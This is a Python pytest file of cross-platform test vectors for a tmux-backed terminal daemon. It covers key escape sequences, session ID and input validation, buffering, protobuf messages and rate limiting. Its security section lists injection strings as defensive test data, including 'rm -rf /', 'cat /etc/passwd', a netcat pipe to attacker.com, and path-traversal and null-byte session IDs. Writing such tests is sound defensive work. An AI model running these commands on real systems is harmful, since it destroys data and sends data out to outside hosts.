"""Test vectors for terminal I/O cross-platform validation.

These test vectors ensure escape sequence encoding and terminal behavior
is compatible between the daemon (Python) and Android (Kotlin) implementations.

IMPORTANT: The static test vectors should be copied to the Kotlin/Android
test suite to ensure both implementations produce identical results.

Run these tests with:
    cd daemon
    uv run pytest tests/terminal/test_vectors.py -v

To see the full vectors for copying to Kotlin:
    uv run pytest tests/terminal/test_vectors.py -v -s -k test_generate_all_vectors
"""

import pytest


# ============================================================================
# KEY ESCAPE SEQUENCE VECTORS
# ============================================================================

class TestKeyEscapeSequenceVectors:
    """Test vectors for key type to escape sequence mapping.

    These vectors must be identical in both Python and Kotlin implementations.
    The hex values are the exact bytes that should be sent to tmux.
    """

    # Format: (key_name, key_type_enum_value, expected_bytes_hex)
    KEY_VECTORS = [
        # Basic keys
        ("ENTER", 1, "0d"),               # \r (carriage return)
        ("TAB", 2, "09"),                 # \t
        ("BACKSPACE", 3, "7f"),           # DEL
        ("ESCAPE", 4, "1b"),              # ESC
        ("DELETE", 5, "1b5b337e"),        # \x1b[3~
        ("INSERT", 6, "1b5b327e"),        # \x1b[2~

        # Arrow keys
        ("UP", 10, "1b5b41"),             # \x1b[A
        ("DOWN", 11, "1b5b42"),           # \x1b[B
        ("RIGHT", 12, "1b5b43"),          # \x1b[C
        ("LEFT", 13, "1b5b44"),           # \x1b[D

        # Navigation
        ("HOME", 20, "1b5b48"),           # \x1b[H
        ("END", 21, "1b5b46"),            # \x1b[F
        ("PAGE_UP", 22, "1b5b357e"),      # \x1b[5~
        ("PAGE_DOWN", 23, "1b5b367e"),    # \x1b[6~

        # Function keys
        ("F1", 30, "1b4f50"),             # \x1bOP
        ("F2", 31, "1b4f51"),             # \x1bOQ
        ("F3", 32, "1b4f52"),             # \x1bOR
        ("F4", 33, "1b4f53"),             # \x1bOS
        ("F5", 34, "1b5b31357e"),         # \x1b[15~
        ("F6", 35, "1b5b31377e"),         # \x1b[17~
        ("F7", 36, "1b5b31387e"),         # \x1b[18~
        ("F8", 37, "1b5b31397e"),         # \x1b[19~
        ("F9", 38, "1b5b32307e"),         # \x1b[20~
        ("F10", 39, "1b5b32317e"),        # \x1b[21~
        ("F11", 40, "1b5b32337e"),        # \x1b[23~
        ("F12", 41, "1b5b32347e"),        # \x1b[24~

        # Control characters
        ("CTRL_C", 50, "03"),             # ETX
        ("CTRL_D", 51, "04"),             # EOT
        ("CTRL_Z", 52, "1a"),             # SUB
    ]

    def test_all_key_vectors_defined(self):
        """Ensure all keys have vectors defined."""
        # Check we have all expected keys
        key_names = [v[0] for v in self.KEY_VECTORS]
        assert "ENTER" in key_names
        assert "CTRL_C" in key_names
        assert "UP" in key_names
        assert "F12" in key_names

    @pytest.mark.parametrize("key_name,key_type,expected_hex", KEY_VECTORS)
    def test_key_sequence_format(self, key_name, key_type, expected_hex):
        """Validate key sequence hex format."""
        # Hex should be valid
        bytes.fromhex(expected_hex)

        # Should not be empty
        assert len(expected_hex) >= 2

    def test_arrow_keys_are_csi_sequences(self):
        """Arrow keys should use CSI (ESC [) sequences."""
        arrow_keys = [v for v in self.KEY_VECTORS if v[0] in ("UP", "DOWN", "LEFT", "RIGHT")]
        for name, _, hex_seq in arrow_keys:
            assert hex_seq.startswith("1b5b"), f"{name} should start with ESC ["

    def test_control_chars_are_single_byte(self):
        """Control characters should be single bytes."""
        ctrl_keys = [v for v in self.KEY_VECTORS if v[0].startswith("CTRL_")]
        for name, _, hex_seq in ctrl_keys:
            assert len(hex_seq) == 2, f"{name} should be single byte"

    def test_generate_all_vectors_for_kotlin(self):
        """Generate vectors in Kotlin format.

        Run with: pytest -s -k test_generate_all_vectors
        """
        print("\n" + "=" * 60)
        print("CROSS-PLATFORM KEY ESCAPE SEQUENCE VECTORS FOR KOTLIN")
        print("=" * 60)
        print("""
// Copy this to your Kotlin test file
object KeySequenceVectors {
    // Format: KeyType enum value -> expected bytes as hex string
    val KEY_VECTORS = mapOf(""")

        for name, key_type, hex_seq in self.KEY_VECTORS:
            print(f'        KeyType.KEY_{name} to "{hex_seq}",')

        print("""    )
}
""")


# ============================================================================
# CTRL+LETTER VECTORS
# ============================================================================

class TestCtrlLetterVectors:
    """Test vectors for Ctrl+letter combinations.

    In raw mode, Ctrl+A through Ctrl+Z map to bytes 0x01-0x1A.
    """

    # Format: (letter, expected_byte)
    CTRL_LETTER_VECTORS = [
        ("A", 0x01),
        ("B", 0x02),
        ("C", 0x03),  # Same as KEY_CTRL_C
        ("D", 0x04),  # Same as KEY_CTRL_D
        ("E", 0x05),
        ("F", 0x06),
        ("G", 0x07),  # BEL
        ("H", 0x08),  # Backspace (alternative)
        ("I", 0x09),  # Tab (same as KEY_TAB)
        ("J", 0x0A),  # Newline
        ("K", 0x0B),
        ("L", 0x0C),  # Form feed (clear screen)
        ("M", 0x0D),  # Carriage return (same as Enter)
        ("N", 0x0E),
        ("O", 0x0F),
        ("P", 0x10),
        ("Q", 0x11),  # XON
        ("R", 0x12),
        ("S", 0x13),  # XOFF
        ("T", 0x14),
        ("U", 0x15),  # NAK (kill line)
        ("V", 0x16),
        ("W", 0x17),  # Kill word
        ("X", 0x18),
        ("Y", 0x19),
        ("Z", 0x1A),  # Same as KEY_CTRL_Z
    ]

    @pytest.mark.parametrize("letter,expected_byte", CTRL_LETTER_VECTORS)
    def test_ctrl_letter_calculation(self, letter, expected_byte):
        """Verify Ctrl+letter byte calculation."""
        # Ctrl+letter = letter_position (A=1, B=2, etc.)
        calculated = ord(letter.upper()) - ord("A") + 1
        assert calculated == expected_byte


# ============================================================================
# SESSION ID VALIDATION VECTORS
# ============================================================================

class TestSessionIdValidationVectors:
    """Test vectors for session ID validation in terminal commands."""

    # Valid session IDs
    VALID_SESSION_IDS = [
        "abc123def456",
        "ABCDEF123456",
        "000000000000",
        "zzzzzzzzzzzz",
        "aB1cD2eF3gH4",
    ]

    # Invalid session IDs (should be rejected)
    INVALID_SESSION_IDS = [
        ("", "empty"),
        ("abc123", "too_short"),
        ("abc123def456789", "too_long"),
        ("abc-123-def", "contains_dash"),
        ("abc_123_def_", "contains_underscore"),
        ("abc 123 def ", "contains_space"),
        ("abc123def45!", "contains_special"),
        ("abc123def45\n", "contains_newline"),
        ("../../../etc", "path_traversal"),
        ("/etc/passwd", "absolute_path"),
        ("abc\x00def456", "null_byte"),
    ]

    @pytest.mark.parametrize("session_id", VALID_SESSION_IDS)
    def test_valid_session_ids(self, session_id):
        """Valid session IDs should pass validation."""
        import re
        pattern = re.compile(r"^[a-zA-Z0-9]{12}$")
        assert pattern.match(session_id), f"{session_id} should be valid"

    @pytest.mark.parametrize("session_id,reason", INVALID_SESSION_IDS)
    def test_invalid_session_ids(self, session_id, reason):
        """Invalid session IDs should fail validation."""
        import re
        pattern = re.compile(r"^[a-zA-Z0-9]{12}$")

        # Also check for dangerous patterns
        has_traversal = ".." in session_id or "/" in session_id
        has_null = "\x00" in session_id

        is_invalid = not pattern.match(session_id) or has_traversal or has_null
        assert is_invalid, f"{session_id} ({reason}) should be invalid"


# ============================================================================
# INPUT VALIDATION VECTORS
# ============================================================================

class TestInputValidationVectors:
    """Test vectors for terminal input validation."""

    # Max input size (64KB)
    MAX_INPUT_SIZE = 65536

    # Valid inputs
    VALID_INPUTS = [
        (b"hello", "simple_text"),
        (b"", "empty"),
        (b"\r", "carriage_return"),
        (b"\x1b[A", "escape_sequence"),
        (b"x" * 1000, "medium_text"),
        (b"\x00\x01\x02", "binary"),
        ("こんにちは".encode("utf-8"), "unicode"),
    ]

    # Invalid inputs (should be rejected)
    INVALID_INPUTS = [
        (b"x" * 100000, "too_large"),
    ]

    @pytest.mark.parametrize("data,description", VALID_INPUTS)
    def test_valid_inputs(self, data, description):
        """Valid inputs should pass size check."""
        assert len(data) <= self.MAX_INPUT_SIZE, f"{description} should be valid"

    @pytest.mark.parametrize("data,description", INVALID_INPUTS)
    def test_invalid_inputs(self, data, description):
        """Invalid inputs should fail size check."""
        assert len(data) > self.MAX_INPUT_SIZE, f"{description} should be invalid"


# ============================================================================
# CIRCULAR BUFFER VECTORS
# ============================================================================

class TestCircularBufferVectors:
    """Test vectors for circular buffer behavior."""

    BUFFER_SCENARIOS = [
        {
            "description": "Basic append returns incrementing sequences",
            "max_size": 1000,
            "operations": [
                ("append", b"hello"),
                ("append", b"world"),
                ("append", b"test"),
            ],
            "expected_sequences": [0, 1, 2],
            "expected_start_seq": 0,
        },
        {
            "description": "Buffer evicts old data when full",
            "max_size": 50,  # Small buffer
            "operations": [
                ("append", b"x" * 20),  # seq 0, 20 bytes
                ("append", b"y" * 20),  # seq 1, 40 bytes
                ("append", b"z" * 20),  # seq 2, 60 bytes -> evicts seq 0
            ],
            "expected_start_seq": 1,  # seq 0 evicted
        },
        {
            "description": "Get from sequence returns correct chunks",
            "max_size": 1000,
            "operations": [
                ("append", b"first"),
                ("append", b"second"),
                ("append", b"third"),
            ],
            "get_from": 1,
            "expected_chunks": [b"second", b"third"],
        },
        {
            "description": "Get from old sequence reports skipped",
            "max_size": 30,
            "operations": [
                ("append", b"x" * 10),  # seq 0
                ("append", b"y" * 10),  # seq 1
                ("append", b"z" * 10),  # seq 2 -> evicts 0
                ("append", b"w" * 10),  # seq 3 -> evicts 1
            ],
            "get_from": 0,
            "expected_skipped_from": 0,
        },
    ]


# ============================================================================
# PROTOBUF ENCODING VECTORS
# ============================================================================

class TestProtobufEncodingVectors:
    """Test vectors for protobuf message encoding."""

    # TerminalOutput message vectors
    OUTPUT_VECTORS = [
        {
            "description": "Basic output",
            "session_id": "abc123def456",
            "data_hex": "48656c6c6f",  # "Hello"
            "sequence": 0,
            "partial": False,
        },
        {
            "description": "Output with sequence",
            "session_id": "abc123def456",
            "data_hex": "1b5b324a",  # ESC[2J (clear screen)
            "sequence": 100,
            "partial": False,
        },
        {
            "description": "Partial output",
            "session_id": "xyz789abc012",
            "data_hex": "e4b8ade6",  # Partial UTF-8
            "sequence": 50,
            "partial": True,
        },
    ]

    # TerminalInput message vectors
    INPUT_VECTORS = [
        {
            "description": "Data input",
            "session_id": "abc123def456",
            "input_type": "data",
            "data_hex": "6c730d",  # "ls\r"
        },
        {
            "description": "Special key input",
            "session_id": "abc123def456",
            "input_type": "special",
            "key_type": 50,  # KEY_CTRL_C
            "modifiers": 0,
        },
        {
            "description": "Special key with modifier",
            "session_id": "abc123def456",
            "input_type": "special",
            "key_type": 1,  # KEY_ENTER
            "modifiers": 1,  # CTRL
        },
    ]

    # TerminalAttached event vectors
    ATTACHED_VECTORS = [
        {
            "description": "Basic attach response",
            "session_id": "abc123def456",
            "cols": 80,
            "rows": 24,
            "buffer_start_seq": 0,
            "current_seq": 0,
        },
        {
            "description": "Attach with existing buffer",
            "session_id": "xyz789abc012",
            "cols": 80,
            "rows": 24,
            "buffer_start_seq": 50,
            "current_seq": 150,
        },
    ]

    # Error event vectors
    ERROR_VECTORS = [
        {
            "description": "Session not found",
            "session_id": "nonexistent00",
            "error_code": "SESSION_NOT_FOUND",
            "message": "Session not found",
        },
        {
            "description": "Not attached",
            "session_id": "abc123def456",
            "error_code": "NOT_ATTACHED",
            "message": "Not attached to session",
        },
        {
            "description": "Rate limited",
            "session_id": "abc123def456",
            "error_code": "RATE_LIMITED",
            "message": "Too many requests",
        },
        {
            "description": "Input too large",
            "session_id": "abc123def456",
            "error_code": "INPUT_TOO_LARGE",
            "message": "Input exceeds 65536 bytes",
        },
        {
            "description": "Pipe error",
            "session_id": "abc123def456",
            "error_code": "PIPE_ERROR",
            "message": "Failed to read terminal pipe",
        },
    ]


# ============================================================================
# RATE LIMITING VECTORS
# ============================================================================

class TestRateLimitingVectors:
    """Test vectors for input rate limiting."""

    RATE_LIMIT_CONFIG = {
        "max_per_second": 100,
        "window_seconds": 1.0,
    }

    SCENARIOS = [
        {
            "description": "Under limit - all allowed",
            "input_count": 50,
            "time_window": 1.0,
            "expected_allowed": 50,
            "expected_rejected": 0,
        },
        {
            "description": "At limit - all allowed",
            "input_count": 100,
            "time_window": 1.0,
            "expected_allowed": 100,
            "expected_rejected": 0,
        },
        {
            "description": "Over limit - some rejected",
            "input_count": 150,
            "time_window": 1.0,
            "expected_allowed": 100,
            "expected_rejected": 50,
        },
        {
            "description": "Sustained rate - window slides",
            "input_count": 200,
            "time_window": 2.0,  # 100/s for 2s
            "expected_allowed": 200,
            "expected_rejected": 0,
        },
    ]


# ============================================================================
# END-TO-END FLOW VECTORS
# ============================================================================

class TestE2EFlowVectors:
    """End-to-end test flow vectors."""

    FLOWS = [
        {
            "name": "Basic attach and input",
            "steps": [
                {"action": "send", "command": "attach", "session_id": "abc123def456"},
                {"action": "expect", "event": "attached", "cols": 80, "rows": 24},
                {"action": "send", "command": "input_data", "data": "ls\r"},
                {"action": "expect", "event": "output", "contains": "ls"},
            ],
        },
        {
            "name": "Special key interrupt",
            "steps": [
                {"action": "send", "command": "attach", "session_id": "abc123def456"},
                {"action": "expect", "event": "attached"},
                {"action": "send", "command": "input_special", "key": "CTRL_C"},
                {"action": "expect", "event": "output"},  # Should see ^C or interrupt
            ],
        },
        {
            "name": "Reconnection with sequence",
            "steps": [
                {"action": "send", "command": "attach", "session_id": "abc123def456"},
                {"action": "expect", "event": "attached", "current_seq": 100},
                {"action": "disconnect"},
                {"action": "send", "command": "attach", "session_id": "abc123def456", "from_sequence": 100},
                {"action": "expect", "event": "attached"},
                {"action": "expect", "event": "output"},  # Buffered output
            ],
        },
        {
            "name": "Error handling - session not found",
            "steps": [
                {"action": "send", "command": "attach", "session_id": "nonexistent00"},
                {"action": "expect", "event": "error", "code": "SESSION_NOT_FOUND"},
            ],
        },
        {
            "name": "Error handling - not attached",
            "steps": [
                # Send input without attaching first
                {"action": "send", "command": "input_data", "data": "hello"},
                {"action": "expect", "event": "error", "code": "NOT_ATTACHED"},
            ],
        },
        {
            "name": "Detach flow",
            "steps": [
                {"action": "send", "command": "attach", "session_id": "abc123def456"},
                {"action": "expect", "event": "attached"},
                {"action": "send", "command": "detach", "session_id": "abc123def456"},
                {"action": "expect", "event": "detached", "reason": "user_request"},
            ],
        },
    ]


# ============================================================================
# SECURITY ATTACK VECTORS
# ============================================================================

class TestSecurityVectors:
    """Security-focused test vectors."""

    # Command injection attempts in session_id
    SESSION_ID_INJECTION_ATTEMPTS = [
        "../../../etc/passwd",
        "/etc/passwd",
        "abc\x00def456",
        "abc; rm -rf /",
        "abc`id`def456",
        "abc$(id)def456",
        "abc\nrm -rf /",
    ]

    # Command injection attempts in input data
    # These should be sent literally, NOT executed
    INPUT_INJECTION_ATTEMPTS = [
        b"; rm -rf /",
        b"&& cat /etc/passwd",
        b"| nc attacker.com 1234",
        b"`id`",
        b"$(whoami)",
        b"\n rm -rf /",
        b"\x00; id",
    ]

    # Oversized inputs (should be rejected)
    OVERSIZED_INPUTS = [
        b"x" * 100000,   # 100KB
        b"x" * 1000000,  # 1MB
    ]

    @pytest.mark.parametrize("session_id", SESSION_ID_INJECTION_ATTEMPTS)
    def test_session_id_injection_rejected(self, session_id):
        """Session ID injection attempts should be rejected."""
        import re
        pattern = re.compile(r"^[a-zA-Z0-9]{12}$")
        has_dangerous = ".." in session_id or "/" in session_id or "\x00" in session_id
        assert not pattern.match(session_id) or has_dangerous

    @pytest.mark.parametrize("data", INPUT_INJECTION_ATTEMPTS)
    def test_input_injection_sent_literally(self, data):
        """Input injection attempts should be sent literally to tmux.

        tmux send-keys -l sends keys literally without shell interpretation.
        These tests document that we're aware of the vectors and handle them.
        """
        # The data should be sent as-is to tmux send-keys -l
        # The terminal will receive the literal bytes, not execute them
        assert isinstance(data, bytes)

    @pytest.mark.parametrize("data", OVERSIZED_INPUTS)
    def test_oversized_input_rejected(self, data):
        """Oversized inputs should be rejected."""
        assert len(data) > 65536  # MAX_INPUT_SIZE
